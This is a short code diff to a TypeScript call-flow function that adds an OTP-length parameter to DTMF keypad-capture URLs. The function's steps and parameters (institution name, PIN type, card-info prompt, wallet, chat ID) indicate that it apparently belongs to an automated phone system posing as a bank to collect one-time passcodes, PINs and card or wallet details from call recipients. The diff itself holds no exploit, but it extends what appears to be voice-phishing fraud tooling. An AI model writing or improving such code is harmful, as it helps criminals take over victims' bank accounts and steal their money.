@@ -15,6 +15,7 @@ export const answer = ({
   pinType,
   customMessage,
   actions,
+  otpLength,
 }: {
   institutionName: string;
   language: languages | undefined;
@@ -28,6 +29,7 @@ export const answer = ({
   pinType?: string;
   customMessage?: string;
   actions?: string;
+  otpLength?: number;
 }): CallFlowParameter => {
   switch (step) {
     case 'bank':
@@ -69,7 +71,7 @@ export const answer = ({
             id: 'bankStepGoto',
             action: 'fetchCallFlow',
             options: {
-              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
+              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
             },
           },
         ],
@@ -113,7 +115,7 @@ export const answer = ({
             id: 'accountStepGoto',
             action: 'fetchCallFlow',
             options: {
-              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
+              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}&otpLength=${otpLength}`,
             },
           },
         ],
@@ -161,7 +163,7 @@ export const answer = ({
                 process.env.ENDPOINT_URL
               }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
                 ?.replace(/\s/g, '')
-                .toLowerCase()}`,
+                .toLowerCase()}&otpLength=${otpLength}`,
             },
           },
         ],
